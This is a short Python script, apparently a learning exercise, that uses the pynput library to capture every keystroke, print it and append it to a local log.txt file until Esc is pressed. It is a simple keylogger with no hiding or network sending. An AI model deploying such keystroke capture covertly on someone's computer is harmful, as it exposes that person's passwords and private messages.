import pynput
from pynput.keyboard import Listener, Key


def on_press(key):
    print(f'{key} pressed')
    write_to_file(key)


def on_release(key):
    if key == Key.esc:
        return False  # break the loop of program


def write_to_file(key):
    with open('log.txt', 'a') as file:
        str_key = str(key).replace("'", "")

        # if key is regular words or numbers
        if str_key.find('Key') == -1:
            file.write(str_key)
            return

        # if key is special key

        if str_key == 'Key.enter':
            file.write('\n')
            return

        if str_key == 'Key.space':
            file.write(' ')
            return

        # other than enter and space, add [] to it
        file.write(f'[{str_key}]')


with Listener(on_press, on_release) as listener:
    listener.join()
